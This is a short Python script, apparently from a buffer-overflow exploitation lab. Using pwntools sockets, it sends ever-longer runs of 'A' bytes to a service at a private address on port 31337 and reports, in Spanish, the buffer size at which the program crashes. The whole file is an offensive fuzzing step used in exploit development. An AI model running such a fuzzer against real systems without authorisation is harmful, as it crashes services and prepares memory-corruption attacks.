#!/usr/bin/python3
from pwn import log, socket, time

buffer = [b""]
counter = 100

bar = log.progress("")

while len(buffer) < 32:
    buffer.append(b"A" * counter)
    counter += 100

for strings in buffer:
    try:
        time.sleep(1)
        bar.status(f"Enviando: {len(strings)} bytes")

        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.connect(("192.168.204.1", 31337))
        shell.recv(1024)

        shell.send(strings + b"\r\n")

        shell.recv(1024)
        shell.close()

    except:
        bar.success(f"El programa se detuvo al enviar: {len(strings)} bytes")
        exit()
